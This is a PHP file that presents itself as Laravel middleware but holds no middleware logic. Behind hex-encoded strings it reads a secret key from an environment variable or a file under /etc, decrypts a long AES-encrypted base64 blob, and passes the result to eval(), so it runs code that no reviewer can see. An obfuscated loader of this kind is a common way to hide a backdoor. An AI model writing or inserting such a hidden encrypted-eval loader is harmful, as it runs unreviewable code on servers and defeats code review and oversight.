<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('OlGV2IrV37gfDGkrruatHA==');

$c=base64_decode(

'GQZrL4k+tgJpFVulR3+FXutrj/nkkiN68EZkm799FuPVmLN4fsFwjw041GNHLvM2hni6pg8QVhiw' .
'sbz7LIZ6Jo4noFL3VqUxTMPYIeVqIR7OiJlbE1BzeGZewOgXP8lnv5WuyOXX1Qy8OzPK4YRSUIXn' .
'PeHYVIA9ByvN+1+BrV8ILUlERgFGCqOD+/7A6BqSswLsTp5MZysnhhE8Xu2Zd0MzKaVKaHWoT5jU' .
'GZ9SaixyiuSQdm+43401KpsU9G1Uho/sCWOnrjEtDHoqXLA5ePH8jzvgTmjo8BK21d8rIHJPee6v' .
'TzDtPvRmGiAyAuaVfqiStOZorPGG44lY750x1MRg59HEDREQb7w+/mW6wl2ePJaUbEGBXaF8oLA2' .
'RlBxwFY2iMogJ7xCXbI6bBZRLI8zgf6VkuBi5DEr2qWAbXclnSlIlC3wkAFClf5sOhOzuJKwrQH3' .
'lQovd0L2XFZjSzUF5Twne2A7vlKDs78nh65MHpGIPNOark//rCAxPSqbKrn2sFC0rzPpdi2HN1Q9' .
'zPJu3R1EaM2YpHbyI5mluNlFYORev3KQ920JgRIoj2MjoJHTd6KbEVUTdhVPFuE8ENqqgZ1diiI/' .
'Pxbm1qkbmuDL9TkQaiwF60IatZ0m4U0Z+zaSZt6zXO9UlMoKrtZPNQnudlW0YBpQxMb5HBnCYI9Q' .
'ulHnVKfHkHojGQo+iwverCDN1RysCSIRcSCqazr8vqfD7GbLzj2pTQZQJiD5uOD+lRvFwTiou0K7' .
'0SU0zwCY198dP78A1CDUMrNGCWKAGhNzZph5At2RRAs09usIrFubAgLbyjLwF6SdKC72CcFR+evB' .
'eO4EUCiFEEU64Ym8X7wvD/zRmB2d2zWvDyXWJUxdFFDC7dVL7gsZKWQ/jev51hezrL7ZaLQ0pWYR' .
'72PrTSlP3Rcr5fu3Kx/zMJDajWcL7rVGYHnDnV7hFBv1J535FkKQWaLy9Sa4Fd+xf0sErvcAgxHW' .
'zYA947RoH1llKdSrnAUrmrmnqyiRbU/9zUmlvBAbRtFDeBpFOgJorTK01hPjWraI0Lc6MGsbWaxK' .
'Kg309lu5TA80toNdiIg8fw1puU25iTRhhvn3uYPOocvLbpO28J0SyPEi6PmXnTufhmBzH2lloY+D' .
'0k0wAlVJictsmUgSp636073yVSIxgsgNpKRWcsnRQvva/8hPRgq5S58A/lftSYX8NnO93IsVr0yj' .
'VZ8JOuJJdPiHQqq1ZvApKwWlCh1AZ3eClEdLO1uzlZZxsoXzFCQ2n212UsURuIc1BW+2meEWGF+U' .
'yf/s/VZ0iln3eQORqG33S5w07UwEqjlcXX0i8hHilMwIke1IWasGTSBby4eBcLpSKDQ1b+w74i1D' .
'WMzEbXYoXrrarqyCSfcQMtbX7qHjHbKLdu05fDqS3d5lJoGUTDBKWFBQxYigZFxH9HlayNqzQ1Wi' .
'tCwbDSXDTzdBIVXi1DTdpVxFY/DkorzaBf3ZweYTgkZ2H8TE2Q0WX0NyeaHzSAjn/St6cAEiSov1' .
'rNAM2ZHviecdFtYCNYOpOTgopWrR3MOYQKqqBw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

